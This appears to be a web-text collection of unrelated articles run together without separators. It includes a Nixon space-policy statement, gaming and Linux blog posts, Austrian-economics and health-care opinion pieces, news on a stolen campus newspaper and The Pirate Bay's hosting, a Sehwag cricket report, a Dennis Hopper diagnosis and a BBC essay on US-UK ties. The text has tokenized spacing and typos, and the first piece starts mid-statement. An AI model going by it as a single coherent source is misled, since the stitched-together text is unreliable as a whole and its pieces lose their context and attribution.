We should continue to pursue other applications of space - related technology in a wide variety of fields , including meteorology , communications , navigation , air traffic control , education , and national defense .
The very act of reaching into space can help man improve the !
quality of life on earth .
6 . We should encourage greater inter. national cooperation in space .
In my address to the United Nations last September , I indicated that the United States will take positive , concrete steps " toward internationalizing man 's epic venture into space -- an adventure that belongs not to one nation but to all mankind .
I believe that both the adventures and the applications of space missions should be shard by all peoples .
Our progress will be faster and our accomplishments will be greater if nations will join together in this effort , both in contributing the resources and in enjoying the benefits .
Unmanned scientific payloads from other nations already make use of our space launch capability on a cost - shared basis ; we look forward to the day when these arrangements can be extended to larger applications satellites and astronaut crews .
The Administrator of NASA recently met with the space authorities of Western Europe , Canada , Japan , and Australia in an effort to find ways in which we can cooperate more effectively in space .
It is important , I believe , that the space program of the United States meet these six objectives .
A program which achieves these goals will be a balanced space program , one which will extend our capabilities and knowledge and one which will put our new learning to work for the immediate benefit of all people .
As we enter a new decade , we are conscious of the fact that man is also entering a new historic era .
For the first time , he has reached beyond his planet ; for the rest of time , we will think of ourselves as men from the planet earth .
It is my hope that as we go forward with our space program , we can plan and work in a way which makes us proud both of the planet from which we come and of our ability to travel beyond it .

Okay , so between putting up shelving in the garage , paintball , and still getting stuff out of the old house I ’ve still found time to work with Unity .
The two main triumphs of this version are the custom toon shader and the new feature that allows animations to control translations .
This means no more sliding feet since I can use Cheetah to control rotation and translation .
This can be seen in the walking gun ’s walking animation .
I ’ve also snagged some free content from TurboSquid and dumped it in just for something fresh .
On the utility side I ’ve revamped my MultiTag script and now it uses a global Enum for tags instead of just strings .

When Fable III was announced back at GamesCom this year , the warm up news was the announcement that Fable II would be released in an episodic format .
Indeed , the first episode is already out .
At the time , this was viewed as another interesting experiment as the industry increasingly flirts with more extensive digital distribution and whilst Microsoft likely always had one eye on Fable III , they were tight lipped on the prospects of the sequel receiving the same treatment .
The irrepressible Peter Molyneux however , recently implied this is already the plan in a recent interview at the Golden Joystick awards .
TR : What about storytelling ?
You made some interesting comment recently about how you were inspired by Dickens ’ “ Penny Dreadfuls ” when thinking about story in games .
PM : Yes .
It is why I do n’t like demos .
The first part of our game [ Fable 3 ] is going to be free .
And at the end of that first part you can choose to continue playing as normal , by buying the full game .
Or , if you are still not quite sure , just buy the next episode .
And because it is constructed like that , by pure coincidence , the really big inspiration for Fable 3 was the world that Charles Dickens ’ had painted – the idea that there was a very two - faced rich versus the poor society … and the very visual ways in which he wrote about London , everything from Highgate Cemetery through to the workhouses .
It was fantastic inspiration and you can see how that will fit well with the Fable ethos .
The moment you start to realise that all of Dickens ’ books were written to promote the sales of these ‘ Penny Dreadfuls ’ – where the idea was that he wrote a chapter , there was a cliff - hanger and people were literally raiding the ships where the magazines were printed on in their desperation to find out what happened next !
Credit for this should go to Adam Hartley at Tech Radar who aside from scoring a great interview was kind enough to confirm to us that Molyneux was definitely referring to Fable III and not it ’s predecessor .
The majority of the rest is about Project Natal and is also well worth a read .
Immediately however , bigger questions arise from this possible slip .
Will the Fable III episodes be released simultaneously with the physical retail version ?
Because if so , that would imply that Fable III would be available for digital download day and date with the retail release ( as Molyneux said , you can opt to buy the whole game and just carry on playing ) .
If that ’s the case , as much as it is another big step for Microsoft in of itself , what about the pricing ?
Microsoft ’s Games on Demand service has been oft criticised as too expensive , with no adequate compensation to purchasers for the lack of a physical product they can release value from by selling on or trading in .
Not to mention the saving realised from cutting out the middle man .
If the first part of the game is free , it seems nonsensical to charge gamers the same price digitally for the rest of the game as the physical version of the whole thing in the shops .
This all could be moot of course .
Perhaps Fable III wo n’t be another milestone on the way to full digital distribution of games , instead adopting the same approach as Fable II by releasing the episodes post the disc release .
Admittedly , there does n’t seem to be any word on the second Fable II episode as best we can tell and after all , seasoned Fable fans would likely rather pick up the entire game at once on disc than wait impatiently for each episode if they were to be staggered .
Such a move however , would strike us as a missed opportunity and the question is n’t dodged so easily by circumstance this time around .
Whilst the transition to digital distribution is going to be a rocky one , with the issue of pricing and keeping retail partners happy non-trivial , at some point someone is just going to have to bite the bullet and make the jump with a day and date release of a full game on one of the console download services .

Go is not exactly setting the world alight partly because it is compromised in it ’s own way .
Half measures are only going to go so far .
Will Fable III be the first serious shot across the bows of the game retailers ?
Only time will tell .

" I see green shoots , " said Fed Chairman Ben Bernanke on 60 Minutes back in March , doing his best rendition of Haley Joel Osment from the movie The Sixth Sense .
Since then , every poor economic headline in the lapdog media has been preceded with the word " unexpected , " as if the clueless chairman 's pronouncements were suddenly the Gospel , and the economy had indeed recovered .
Phantom US Economic Recovery
Common sense tells us that if phenomenon A causes problem B , then B cannot be rectified unless A is first removed .
As an adherent of the Austrian School of economics , I can confidently tell you that a sustainable US recovery is not at hand .
An upward blip in the GDP reading ( itself a flawed measure of material well - being ) must not be mistaken for a sustainable recovery , especially when government borrowing is unprecedentedly high and a lot of the input parameters , not the least of which is the GDP deflator , can be fudged .
I 'll borrow an analogy from Peter Schiff .
Imagine if you will a victim at the unfortunate end of a Brock Lesnar knuckle sandwich .
The blow has knocked him out cold and the medics try to revive him .
The best suggestion they can come up with is to have Lesnar pound the man 's head even harder with his fists .
When the man has seizures from the repeated pounding , a medic ( coincidently named Bernanke ) screams gleefully " Hurray , he 's moving . "
Sadly , such is the response to our present crisis by the policy makers in Washington , DC .
To solve a problem caused by malinvestments resulting from easy credit at 1 percent interest rates , the Fed is supplying even more easy money at 0.25 percent .
None of the malinvestments have been allowed to be liquidated .
Housing prices have been propped up , banks and auto companies have been bailed out , regulations have been increased , debt covenants have been violated , unemployment insurance has been extended .
In addition , there 's the cap - and - trade bill , the healthcare bill , and a " czar " around every corner .
All of these increase the already - humongous burden on wealth creators .
In short , the problems that caused the Great Recession have been compounded .
Real output must then necessarily decline .
How can anyone logically assert that we are in the beginning of a recovery ?
Declining output is not the answer to keep a system with a debt - to - GDP ratio nearing 400 percent ( 800 percent if you include Social Security and Medicare obligations ) solvent .
From this vantage point , one can conclude that the real recession is ahead of us , not behind us .
One then must decide whether it will be a deflationary recession or an inflationary recession .
Intelligent people can disagree on this , but my take is inflationary .
What 's Happening Below the Surface ?
Since the Lehman collapse over a year ago , the cracks in the banking system have been papered over with an unprecedented amount of money created out of thin air .
However , underneath that surface , the real pool of savings is continually being channeled away from wealth creators to malinvestments such as housing , autos , and banking .
" For a fractional - reserve - banking system to stay solvent , the money supply needs to be continually increased by at least the weighted - average interest rate . "
This means that total output will decline eventually because there are no investments being made to maintain capital and improve productive capacity .
There may be blips here and there , but they are more likely to be the result of capital consumption than of any sustainable increase in output .
Meanwhile , for reasons detailed below , the money supply will constantly increase .
We then have the textbook case of more money chasing fewer goods , leading to rampant price escalation .
Deflation Begets Inflation
If you happen to catch a NASCAR race on TV , you might hear a driver screaming over his radio , " Tight , tight , tight … LOOOSE ! "
This cry is followed invariably by a crash .
What the driver is referring to is his race car 's inability to turn the corner .
A " tight " condition means the car does n't want to turn and is heading straight for the wall .
A " loose " condition means the car turns too readily and wants to spin out .
When a car is difficult to turn , the driver ends up putting so much wheel into it that when the car eventually does turn , it overshoots , spinning out of control ; and the driver rear - ends the car into the wall .
This is exactly the scenario I envision for the impending price inflation .
Bernanke and company are screaming that there is deflation everywhere they look .
To combat this deflation , the Fed will keeping printing money and adding reserves by buying all kinds of assets .
This will continue until general prices violently overshoot on the other side , causing runaway price inflation .
The M2 Money - Supply Barometer
The M2 money supply is used by a lot of economists as a barometer to gauge price inflationary pressures .
Over the past six months or so , this metric has declined marginally .
So if one defines deflation as a reduction in the M2 money supply , then we are indeed experiencing deflation .
On the surface , consumers are finally getting religion , curbing their spending habits and paying down debt .
Paying down debt is a deflationary activity because it reduces money supply .
Unfortunately , not everyone will be able to pay off their debts .
For a fractional - reserve - banking system to stay solvent , the money supply needs to be continually increased by at least the weighted - average interest rate .
This means that money supply needs to grow exponentially .
Consider a system with $ 100 in loans due in a year at a 10 percent interest rate .
The total amount of money in the system is only $ 100 but the amount due at the end of the year is $ 110 .
Where will the $ 10 come from ?
It has to be lent into existence at some point prior to when the $ 110 is due .
" It goes without saying that deflation would have been very painful for any debtor .
Consider the most indebted entities : the government , banks , powerful corporations , homeowners , and private equity funds run by insiders . "
Absent this increase in money supply , the loan will default .
On the other hand , an ever - increasing money supply will quickly lead to runaway price inflation , because real output will be unable to keep pace with money - supply growth .
In a sound - money , 100 - percent - reserve - banking system , an overwhelming majority of loans would be made to wealth creators .
These loans would be funded by real savings and would eventually be liquidated ( to simplify the explanation ) by the lenders purchasing the produce of borrowers .
These can therefore be called self - liquidating loans .
I 'm not implying there would be no bad loans , just that bad loans would be minimal compared to our current system , because underwriting would be very strict and the fallout of bad lending decisions would stop with a bank 's shareholders .
The vast majority of housing loans and auto loans made during the last boom cannot really be classified as self - liquidating because both of these ( I hesitate to call them assets ) do not produce anything that can be exchanged for money .
Loan Defaults And Banking - System Collapse
In a fractional - reserve - banking system where debt is being paid down , money supply will decline and eventually prices will follow suit .
Businesses will reduce wages to stay profitable .
Any debtor will find his debt burden becoming more onerous as there is less money to go around .
Eventually , defaults will begin , with assets moving from debtors to creditors .
The banking system will implode and depositors will be wiped out until reserves in the system entirely back up deposits outstanding .
This is precisely the process that should have been allowed to happen since 2008 .
Left alone , nothing could have prevented this catastrophic collapse .
Asset prices would 've declined massively , considering that the system had about $ 10 in credit money for every $ 1 in reserve ( before Bernanke injected about $ 1 trillion more in reserves ) .
Why Inflation , Not Deflation ?
It goes without saying that deflation would have been very painful for any debtor .
Consider the most indebted entities : the government , banks , powerful corporations , homeowners , and private equity funds run by insiders .
Given these debtors , is it any wonder that the government chooses bailouts rather than letting the market work its exorcism ?
Every time there is even the slightest deflation , we 'll hear Bernanke et al .
saying that all hell will break loose unless something is done about it .
" Deflation causes debt defaults , which in turn cause bank failures , which in turn result in inflation when the government bails out depositors . "
If the market were allowed to work , loan defaults would cause bank failures en masse .
Bank failures would also wipe out the savings of depositors , because the banks ' debt holders will have seniority in bankruptcy proceedings .
Yes , all hell will break loose , but only for the people who took imprudent risks like borrowing recklessly or depositing money in unsound banks .
If one bank is allowed to go under and its depositors allowed to be wiped out , you can bet your last dollar that there will be a run on every bank the next day , exacerbating the problem exponentially .
The entire banking system would be ruined in a couple of days , with utter chaos , pandemonium , and possibly violence being the rule rather than the exception .
Rather than letting all debtors and depositors be wiped out ( and defaulting on its own obligations ) , the government will intervene via the Fed to shore up the system .
The Fed will print money to purchase troubled assets .
The Fed will also print money to fund the US government , because tax revenues will decline precipitously but government mandates will increase ( normal operations , transfer payments , unemployment payments , wars , etc. ) .
Once the FDIC runs out of funds to make depositors whole , it will tap into a $ 500 billion credit line with the Treasury , which in turn will sell bonds to the Fed to raise the money to repay depositors .
Note that when a bank fails but the depositors are made whole , the original money is still in the system and new money is added ; this is inflationary .
M2 destruction is replaced by M1 creation .
Deflation causes debt defaults , which in turn cause bank failures , which in turn result in inflation when the government bails out depositors .
In trying to save debtors and depositors , the policy makers ensure that everyone loses purchasing power via inflation .
This cycle cannot continue endlessly .
One fine day it will blow sky - high .
Any event may trigger it , from foreigners unloading US dollars and Treasuries , to US citizens realizing that their money is fast losing its purchasing power .
Conclusion
Being a follower of Austrian Economics , I know that real output will continue to decline .
Declining real output will result in lower real savings .
Lower real savings will put pressure on debt repayments and defaults will result .
Private defaults will wipe out banks and depositors , and they will also cause the government to default on its debt .
The Fed will bail out all the affected parties by creating money .
Bailouts cause malinvestments that lower real output , beginning the cycle again .
This cannot continue forever : it will eventually result in a runaway - inflationary depression .

Last month , about 10,000 copies of the University of Arizona 's student newspaper were stolen from various newsstands across the university .
They were found the next day , dumped in various locations on the outskirts of the campus .
You may be wondering " why the hell would anyone steal 10,000 free student newspapers ? "
If you ask the editorial staff at the Daily Wildcat , it was to keep people from reading about the latest fraternity date - rape story .
Tim McDonnell , News Editor for the Wildcat , claims that members of the Phi Kappa Psi fraternity at U of A sent at least two " pledges " to steal as many papers as possible to keep people from reading an article in the paper 's " Police Beat . "
The article , according to McDonnell , was about a girl who filed a police report saying she had been drugged at a Phi Kappa Psi party and thought she may have been raped while she was blacked out .
McDonnell says the reason the Wildcat was able to link the theft to the fraternity can be explained by watching the Coen Brothers classic film The Big Lebowski .
When a stash of the papers was found , McDonnell says the homework of PKP pledges Nick Kovalski and Alex Cornell were found too .
" Is this your homework Larry ? "
The fraternity has neither confirmed or denied involvement , so we called PKP President Keith Peters to find out if two " pledges " were really dumb enough to steal 10,000 free newspapers and then leave their homework with the stolen stash -- the conversation did n't exactly go well .
Peters said he could n't talk because he was walking across campus at the moment , so we asked him to call us back when he had a chance .
" Yeah , we 'll see about that , " he said .
" See about what ? " we asked .
" If I feel like giving you a call back later . "
Easy , junior -- we just wanted your side of the story .
According to McDonnell , the U of A Police Department has n't been much help and closed the case without questioning anyone a few weeks ago .
McDonnell says he does n't think campus police were taking the case seriously because the newspapers are free and the cops are n't sure if a crime was committed .
Calls to U of A police were not immediately returned this afternoon .
McDonnell says the theft cost U of A's student media department about $ 8,500 , and the paper was forced to run free ads for businesses that bought space in the stolen papers .
The university is holding a session of the Greek Standards Board tonight , to see what , if any , disciplinary action can be taken against the fraternity .
Sounds like a little Dean Wormer " double secret probation " might be in the works .
" This was clearly an attempt to silence the media , " McDonnell says .
" We have good evidence that they did this , and we want some justice . "
Michael Arrington may have declared the CrunchPad dead , but that 's not stopping his former partners at FusionGarage , who 've scheduled a video conference with CEO Chandra Rathakrishnan so he can " share his side of the story . "
Chandra will also be demonstrating the 12 - inch capacitive web tablet -- which , somewhat amazingly , will be the first time we 've ever seen proof that the elusive device actually even exists and functions .
We 're definitely curious to hear what Chandra has to say and how he rebuts Arrington 's grandiose and melodramatic tale of woe , but let 's be honest -- we 're also at least mildly suspicious that this whole mess is just a calculated PR stunt .
Stay tuned .
In August the bandwidth supplier to The Pirate Bay was ordered by a court to disconnect the world 's largest BitTorrent tracker from the Internet .
Within hours the site had relocated to a new host which immediately received similar entertainment industry threats .
Now it seems the Bay has left Sweden , setting sail for Ukraine .
At the end of August , Stockholm ’s district court ordered Black Internet , the bandwidth supplier to The Pirate Bay , to disconnect the site from the Internet , pending the outcome of a civil action taken by several Hollywood entertainment companies .
The ISP had little choice but to comply or face large fines , but TPB was quick to react and quickly partnered with a new host .
That short honeymoon was quickly over .
“ It took just 20 minutes before the Hollywood companies telephoned the new host who took over operation of The Pirate Bay , ” commented Patrik from the ISP which had been indirectly supplying bandwidth to TPB .
Despite initially putting on a brave face and standing strong , Patrik ’s company continued to feel the heat .
It is not a large outfit and does n’t have the resources to fight the entertainment industry and its threats .
Last night , Patrik could hold off no longer after receiving mounting threats from the entertainment industries , which culminated in threats of a court summons .
Having come this far , there is little doubt that IFPI and the MPAA would litigate if necessary .
“ I was threatened by the movie and music companies , ” Patrik said today .
He had no choice but to stop servicing TPB .
His company cut off the site ’s bandwidth last night but The Pirate Bay is fully operational , so they must ’ve found another host .
It ’s likely that they already had one prepared .
With Sweden seemingly out of bounds , the site needed to move overseas .
The Netherlands is not really an option anymore and the same goes for most of Western Europe – the solution lies in the east .
On the heels of several rumors today , Patrik said he could confirm news of the move , saying that he believes The Pirate Bay is now hosted in Ukraine .
There have been signs that this Eastern European nation is becoming an attractive location for torrent site hosting , with several large sites and services showing interest .
However , as illustrated by the on - going problems at Demonoid , TorrentFreak is told that the reliability can leave a lot to be desired , with sites having to take measures to ensure that when their Ukrainian hosting becomes unavailable , backup resources kick in .
The standard of Pirate Bay ’s new home ( if it is indeed in Ukraine ) is n’t likely to reflect the comparative luxury of Sweden , but that door seems to be all but closed now .
Whether the site stays in Ukraine is another question , but that aside , a simple one remains ;
Would you host The Pirate Bay in Sweden ?
The answer will likely match the response to “ Do you like lawsuits ? ”
Maybe the Swedish government ’s nightmare is finally over .
Arguments about Muttiah Muralitharan 's declining effectiveness can wait for another time .
This was a day instead to marvel at the magnificence of a man who defies any sort of categorisation or pigeon - holing .
Cricket is a non-contact sport , but watching Virender Sehwag bat is as visceral an experience as watching Muhammad Ali dominate the ring in his prime .
On Thursday afternoon , Sehwag toyed with the greatest offspinner to play the game as though he were some glorified net bowler .
He might as well have been , as India overhauled Sri Lanka 's total of 393 in 67.5 overs .
But for back spasms that restricted him to a more mortal scoring - rate in the last half hour , Sehwag might have become only the second batsman after Sir Donald Bradman to score 300 runs in a day .
Each monumental Sehwag innings has left a trail of destruction in its wake .
At the MCG in 2003 , it was Stuart MacGill 's turn to look like a pie- thrower as he galloped to 195 in just five hours .
In Multan , Shoaib Akhtar was reduced to feeble sledges .
Sehwag 's response was just to compare him to a beggar .
In Chennai against the best Australian side ever , he careered to 155 on a pitch where few others had managed any sort of fluency .
In front of the imposing Galle Fort last year , he dictated the course of a Test with an innings that combined absolute control and appetite for destruction with admirable restraint .
Has there ever been another like him ?
Matthew Hayden could pillage bowlers too , but his strike - rate looks pedestrian next to Sehwag's .
Adam Gilchrist scored marginally quicker but how often did he have to face the new ball ?
Even the King , Sir Vivian Richards , never went after bowlers with such menacing intent , day in , day out .
Traditionally , bowlers have been the game - breakers , setting up victories with inspired spells that reduce sides from positions of comfort to misery .
Sehwag scores at such a clip that he can transform a game in the same way .
India batted only 79 overs on the second day .
Yet they already lead by 50 .
Even if they feel like batting right through day three , the bowlers have all the time in the world to force a result .
Thursday 's tour de force brought to mind a remarkable night in Kingston when Richards ' hero , Smokin ' Joe Frazier , was knocked down five times in the space of two rounds by the giant - fisted George Foreman .
Boxing had never seen a puncher like Foreman , just as cricket has never seen a destroyer like Sehwag .
In cricketing terms , the only apt comparison would be with Gordon Greenidge at Lord 's in 1984 .
On the final day of that Test , England thought they were in with a more than decent chance of victory .
Today , Sri Lanka must have taken the new ball feeling fairly secure .
On both occasions , the illusions were rudely shattered .
Greenidge cut and drove with awesome power as 342 was reeled in from just 66.1 overs .
His contribution was 214 from 241 balls .
Quick by any standard , but nothing outrageous for someone who is batting 's answer to Usain Bolt .
And to think that India started the day with survival on their minds .
Sri Lanka 's 393 looked decent enough on a pitch where the ball had turned from the first session .
Surely , Murali and Rangana Herath would pose serious questions and be far more of a threat than they had been in Ahmedabad and Kanpur .
That was conventional wisdom .
When Sehwag 's batting though , such logic is just bunkum .
At Multan just over five years ago , he pretty much ended the career of one very special offspinner , Saqlain Mushtaq .
Saqlain had gone into that series speaking of a surprise ball , the teesra [ the third one ] .
After much discussion in the media box , it was decided that it was the delivery that Sehwag kept whacking over midwicket for fours and sixes .
Virender Sehwag goes on the rampage AFP
Murali tried plenty of variations at the CCI , perhaps too many .
One moment summed up the uneven nature of the contest .
Sehwag was on 248 when Murali pitched one on middle stump .
The response was a reverse paddle - sweep , a stroke that few could have imagined leave alone seen .
As the ball sped to the rope , past where conventional slip might have stood , Murali just half - flinched and looked away .
Even as fatigue took over , the level of improvisation did n't drop .
Spotting a slower one from Angelo Mathews , Sehwag quickly decided that a booming drive was n't the answer .
A deftly angled bat and the ball raced away past the vacant first - slip position .
For Kumar Sangakkara , the man entrusted with the task of stopping a deluge with a teacup , that was the quintessential dilemma .
When remotely attacking fields were set , Sehwag just shifted his feet and cleared the infield with an ease that bordered on contempt .
When the fielders then fanned out , he was free to pick gaps at will .
Each time he went aerial , the crowd in the stands appeared to jump as high .
It was n't just bedlam though .
Time after time , people turned to those standing next to them , looking bemused .
Each expression said the same thing : ' Did you see THAT ?'
Murali Vijay and Rahul Dravid deserve immense praise for the manner in which they managed the situation .
When a man 's in such prime form , you need to give him as much of the strike as possible , while making sure that you do n't leave the entire run-making burden on his shoulders .
Vijay played a superb innings till his little brain fade , and the manner in which he was prepared to take on even Murali said much about his state of mind .
As for Dravid , is there a more calming sight in the game than him taking guard ?
When not defending with the straightest of bats or watching the carnage from the other end , he played some beautiful strokes , especially in the cover - point region .
No one 's likely to remember them though , blinded as they were by Sehwag 's dazzle .
There were a couple of near escapes at the end , with a tired heave off Murali flying to third man , and a thick outside edge off Tillakaratne Dilshan evading both Jayawardenes , Prasanna and Mahela .
Those were mere dust motes on a pretty perfect picture though .
By the close Sehwag had struck 40 fours and seven sixes , and taken an astonishing 78 from the 70 balls that Murali bowled to him .
Only Brian Lara , back in that halycon series of 2001 , treated him with such disdain .
But at least then Murali was picking up wickets by the bushel at the other end .
Sehwag 's energy levels are remarkable for a man who 's hardly the most svelte figure in the game .
This was his 12th knock in excess of 150 , and the way he paces himself is exceptional .
On Thursday , he did n't just have to contend with the sun beating down , but also with extreme humidity .
The Arabian Sea is just a six - hit away , but instead of losing focus he only made sure that Sri Lanka lost theirs .
" It 's not fat , " said a friend later .
" It 's batting muscle . "
Sri Lanka were so demoralised by the end of the day that it was hard to fathom a route back into the match .
When Chanaka Welegedara went off injured with Sehwag in sight of his double - century , the ball was thrown to Nuwan Kulasekara .
A cut , flick , glance and midwicket - thump later , he looked ready to cry .
As he walked back to his fielding position , he looked every inch the man who'd been asked to take his mate 's place in solitary confinement .
Sehwag now has five of the 10 fastest double - centuries in history , including three of the first four .
This though is a man utterly insouciant when it comes to such landmarks .
He could well go on to obliterate Lara 's record tomorrow .
He certainly has a great chance to put even Bradman in the shade and score a third triple .
None of those possibilities is likely to make him lose sleep though .
For someone who has reduced batting to its most elemental , only the next ball matters .
If it 's there to be hit , regardless of whether he's on 299 or 399 , he 'll go for it .
Which is precisely why it 's such a bloody privilege to watch him play .

Los Angeles , California ( CNN ) --
Actor and filmmaker Dennis Hopper has been diagnosed with prostate cancer , his manager Sam Maydew said Friday .
Hopper is being treated in a special program at the University of Southern California , according to CNN news affiliate KTLA .
He was expected to appear at an exhibition of his photography at the Australian Centre for the Moving Image in Melbourne but has cancelled in order to focus on treatment .
" We 're hoping for the best , " Maydew said .
No other details were immediately available .
On September 30 , Hopper was hospitalized in New York for flu - like symptoms and stomach pains .
He was released the next day feeling " much better , " according to KTLA .
The 73 - year - old Academy Award winner is known for his roles in " Rebel Without a Cause , " " Hoosiers , " " Apocalypse Now " and " Easy Rider " -- the latter of which he also directed -- among scores of other films .
Hopper recently finished shooting the second season of the Starz drama " Crash , " based on the 2006 Oscar - winning film .
I noticed that Sayaon 5.1 Gamers edition live DVD is available for download .
Or you can buy Sabayon DVDs .
I ’ve used and reviewed the Gentoo - based Sabayon many times before and have been very impressed with the Live CD ’s out - of - the - box functionality .
I was quite excited to crack open Sabayon Linux 5.1 “ Gaming ” for obvious reasons .
The Sabayon 5.1 installation process is smooth sailing and one if the simplest around .
Several things I enjoyed about the installation were the option to install XBMC ( Xbox Media Center ) , GNOME ( which I chose ) , or the Fluxbox empty desktop for minamlists that want to start from scratch .
I also enjoyed the user setup built into the installation which grabbed all the information on one or two screens and even had the option for adding additional users .
A nice feature I can see saving me considerable time .
After installation I restarted my computer as prompted and prepared myself for the games .
Sabayon has an interesting startup that hops along to some uninterupted rock music as your system starts up .
Although I think this feature could be great , I was n’t thrilled by the default song selection , but really how can you please everyone ?
The desktop is dark but accented by some thin colorful lines .
The Sabayon menu includes Applications , Places and System tabs making use of the top panel .
Gamers are located under Applications — Games .
The games you see in the screenshot above are all included by default on Sabayon 5,1 Gamers live DVD .
Some popular titles include Battle of Wesnoth , Foobillard , Freeciv , Frozen Bubble , GNOME Games , NeverBall , Nexuiz , OpenArena , Pingus , Pychess , Scorched 3D , Spring , Stepmania , Torcs , Tremulous , Warsow , Warzone 2100 , and Wormux .

Kiss Your Freedoms Goodbye If Health Care Passes
by Andrew P. Napolitano by Andrew P. Napolitano Recently by Andrew P. Napolitano : Health - Care Reform and the Constitution
Congress recognizes no limits on its power .
It doesnt care about the Constitution , it doesnt care about your inalienable rights .
If this health care bill becomes law , America , life as you have known it , freedom as you have exercised it and privacy as you have enjoyed it will cease to be .
Tomorrow , the House of Representatives will vote on a 2,000 - page bill to give the federal government the power to micromanage the health care of every single American .
The bill will no doubt pass .
It will raise your taxes , steal your freedom , invade your privacy , and ration your health care .
Even the Republicans have introduced their version of Obamacare Lite .
It , too , if passed , will compel employers to provide coverage , bribe the states to change their court rules , and tell insurance companies whom to insure .
We do not have two political parties in this country , America .
We have one party ; called the Big Government Party .
The Republican wing likes deficits , war , and assaults on civil liberties .
The Democratic wing likes wealth transfer , taxes , and assaults on commercial liberties .
Both parties like power ; and neither is interested in your freedoms .
Think about it .
Government is the negation of freedom .
Freedom is your power and ability to follow your own free will and your own conscience .
The government wants you to follow the will of some faceless bureaucrat .

From Mary Shelley 's Frankenstein :
Then , in the flicker of the half - light , I saw the creature open his dull yellow eyes .
A breath escaped his lips .
His arms and legs moved .
He was alive !
Almost at once I began to cry .
They were not tears of joy , though , as you might expect .
No , I cried with misery and regret .
" What have I done ? ! " I cried out .
" What a disaster ! " I had chosen his parts so carefully , but it had all gone so terribly wrong .
How can I describe the horror I felt ?
I had seen him before I brought him to life , but I had not seen that he was so ugly .
Now he was alive , and there was nothing more I could do but be sorry for my actions .
... I had spent two years building this creature .
Now that I was finished , the glory of my dream disappeared like the light from my candle .
My heart filled with horror and disgust .
I could not bear to look at him .
When the monster stirs with life , Dr. Frankenstein finally realizes the danger of what he has done .
He has created something without a soul , a creature too simple - minded to anticipate the consequences of its actions .
The monster is reactionary , lashing out impulsively and violently , his only instinct to hurt as he has been hurt .
Dr. Frankenstein thought he was building something grand - - a coalition of human flesh from disparate parts that would elevate him even above God .
It was not to be , and when he denied the monster the things it wanted most , it turned on him , robbing Dr. Frankenstein of everything he valued .
People like Rush Limbaugh , Glenn Beck , Michelle Bachmann , and Orly Taitz are building their own monster , something they hope will be big and powerful enough to strangle the Obama administration and progressive principles .
Just as Dr. Frankenstein used bits and pieces of executed criminals to make his monster , they build theirs from the most extreme elements of hate in this country .
Right now , this putrid mass soaks in the brine of their creator 's rhetoric .
Every week , the creators , aided by a coterie of representatives from the republican party and conservative leadership , attempt to shock it to life .
They try to electrify it with talk of death panels , FEMA concentration camps , Nazism , socialism , communisim , and slavery , threats of Muslim conspiracies involving the president , and hyperbole about stolen freedom .
At times , they ramp up the voltage , and talk about revolution .
The monster is slowly waking .
It has opened one of its jaundiced eyes here and there , lifted an arm and started to identify its targets .
Unlike Dr. Frankenstein , these creators seem unaware that this thing is too ugly and too hateful to control .
Will they recoil when it walks the countryside with deadly intent ?
Will they be shocked to see the destruction of the things all of us have long valued in this country ?
Just as Frankenstein 's monster framed an innocent woman for a murder he committed of an innocent boy - - a woman who went to the gallows for the murder -- their monster attempts to frame innocent people in the Obama administration for their own monstrous crimes .
What will " Dr. Bachmann " and " Dr. Beck " and " Dr. Limbaugh " say when the monster turns on them for not meeting its unreasonable and growing demands ?
Dr. Frankenstein 's monster demanded an equal partner , one that would love and nurture it ; the conservative monster in this country is demanding a legislative partner , one that looks back with the same evil yellow eyes , imbued with the same ugly " heart , " sharing the same values .
What the monster does not understand is that the majority of the country looks on it in horror , our mouths opened , unable to believe extent of its ugliness .
Like society rejected Frankenstein 's monster , we reject this one .
In the end , the creator dies , hounded relentlessly by its creation .
Only then does the monster realize the error of its ways -- it has destroyed the only being capable of understanding it and possibly helping it .
Alone , it promises to destroy itself .
I can only hope this monster is put down before it does real harm .
The republicans -- like Cantor and Boehner , Pawlenty and Perry - - would be wise to quit feeding it .
Make no mistake , something so filled with hatred will not hesitate to bite that hand .
US - UK ' special relationship ' not so special any more
By Paul Reynolds
World affairs correspondent , BBC News website
The transatlantic relationship has not historically been an easy one Some sharp comments by a former British ambassador to Washington during the Iraq inquiry have again cast doubt on the strength of the so - called " special relationship " between Britain and the United States .
This raises the possibility that the Iraq war will be seen as a moment after which that relationship took a real downturn .
Indeed , it is arguable that the " special relationship " of the second half of the 20th Century and since has been something of a departure from what at times has been an antagonistic one .
The latest signs of what might be a historic decline came when the ambassador , Sir Christopher Meyer - always ready with a quote - said that during the lead - up to the war on Iraq in 2003 , Britain failed to make its influence felt on two fronts .
First , it did not insist , as a condition for its support , on progress in the Middle East peace process and on better planning for post - war Iraq .
History warns us not to expect too much from this transatlantic relationship
Second , it did not get a commercial trade - off .
Its demands for changes to an air services agreement and steel tariffs were ignored .
Sir Christopher remarked : " I said to London : ' The key thing now , quite apart from Iraq , is to translate this popularity into real achievements which benefit the national interest ' , and we failed . "
The picture he painted was one in which the then British Prime Minister Tony Blair was very much the junior and perhaps dispensable partner .
Warring allies
And so it also seems with Afghanistan .
British Defence Secretary Bob Ainsworth , under huge pressure from a relentless procession of casualties and coffins , let slip the other day his frustrations over the slowness of President Barack Obama 's decision - making procedures .
Sir Christopher said the UK had failed to asserts itself over the Iraq debate This " hiatus " , as he put it , the British losses and the Afghan elections , had " mitigated against our ability to show progress " .
History , in fact , warns us not to expect too much from this transatlantic relationship .
Dean Acheson , President Truman 's secretary of state , is well - known for saying that Britain had lost an empire and not found a role and that the special relationship had " about played out " .
But he also had this perspective : " Of course a unique relationship existed between Britain and America .
But unique did not mean affectionate .
" We had fought England as an enemy as often as we had fought by her side as a friend . "
You can be the closest American ally , yet at the commercial negotiating table you are an adversary
After all , the relationship began in war in the 18th Century and continued in war at the beginning of the 19th .
The " War of 1812 " actually went on until 1815 .
Perhaps it is confined in its title to one year out of politeness by both sides .
That war was about trade and it was a signal that dealing with the United States on trade matters was always going to be tough .
It is .
You can be the closest American ally , yet at the commercial negotiating table you are an adversary , as Sir Christopher experienced .
Years of rivalry Throughout the 19th Century there was rivalry between the US and UK - in the earlier decades because the US boundaries had not been set and there was competition for land .
This sometimes nearly spilled into armed conflict .
Churchill believed a strong US - UK relationship was essential for peace
In the 1840s , President James K Polk was pressed by Democratic party rivals - the then hawks - to declare that the northern US border should extend to the Pacific along the line of 54 ' 40 " .
The cry went out : " Fifty - four Forty or Fight . "
In fact there was no fight .
In an act of statesmanship , the border was extended along the 49th parallel and peace has reigned ever since , apart from an incident or two later when Irish Fenian supporters raided across into Canada .
Ireland would often be a thorn in the side of the relationship .
